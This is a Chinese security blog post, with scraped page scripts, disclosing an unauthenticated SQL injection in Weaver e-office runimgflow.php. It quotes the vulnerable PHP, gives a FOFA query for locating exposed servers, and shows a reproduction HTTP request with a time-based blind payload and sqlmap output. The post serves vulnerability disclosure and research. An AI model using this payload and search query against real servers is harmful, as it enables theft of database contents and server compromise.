---
title: "泛微e-office runimgflow.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-general-workflow-runimgflow-sqli.html
asset_dir: assets/泛微e-office-runimgflow.php-sql注入漏洞
---

# 泛微e-office runimgflow.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/15 08:20
* 740浏览
* [0评论](#comment)
* 14分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office runimgflow.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

general/workflow/runimgflow.php 业务逻辑如下

```
<?php

include_once( "inc/conn.php" );
include_once( "inc/img_flow.inc.php" );
include_once( "inc/img_patten.inc.php" );
$sql = "  \r\n     SELECT ID,FLOW_ID,PRCS_ID,PRCS_NAME,PRCS_USER,PRCS_ITEM,PRCS_DEPT,PRCS_PRIV,PRCS_TO \r\n\t       FROM flow_process \r\n\t\t       WHERE FLOW_ID=".$_REQUEST['FLOW_ID']." \r\n\t\t\t      ORDER BY PRCS_ID ASC\r\n\t\t\t\t  ";
$res = exequery( $connection, $sql );
```

`FLOW_ID` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /general/workflow/runimgflow.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: FLOW_ID=1 AND 7348=BENCHMARK(5000000,MD5(0x51747266))
```

[![泛微e-office runimgflow.php sql注入漏洞](images/img-001-18e61f7e4cb0.webp)](https://image.mrxn.net/47056fd8ef7a4aaeb3554a4957fc75e7.webp)

成功在延时 5 秒

编程

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 378 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: FLOW_ID=1 AND 2326=2326

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: FLOW_ID=1 AND 7348=BENCHMARK(5000000,MD5(0x51747266))
---
```

imgflow.php、flowimg.php 存在同样的SQL注入漏洞

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语句](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office runimgflow.php sql注入漏洞](https://mrxn.net/jswz/eoffice-general-workflow-runimgflow-sqli.html)  
文章链接：<https://mrxn.net/jswz/eoffice-general-workflow-runimgflow-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-general-workflow-runimgflow-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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